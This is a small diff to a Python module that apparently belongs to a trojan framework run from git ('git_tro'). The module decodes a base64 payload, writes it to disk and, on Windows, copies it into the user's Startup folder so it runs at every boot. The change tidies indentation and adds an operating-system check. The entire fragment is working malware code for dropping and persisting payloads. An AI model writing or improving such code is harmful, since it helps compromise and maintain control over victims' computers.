@@ -54,10 +54,10 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		content	= base64.b64decode(script)
 		if bin:
 			try:
-			    fich = open(targetPath, "wb")
-			    fich.write(content)
-			    fich.close()
-				if winRunOnBoot == True:
+				fich = open(targetPath, "wb")
+				fich.write(content)
+				fich.close()
+				if os.name == 'nt' and winRunOnBoot == True:
 					startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
 					os.system("copy %s %s"%(targetPath, startPath))
 			except PermissionError:
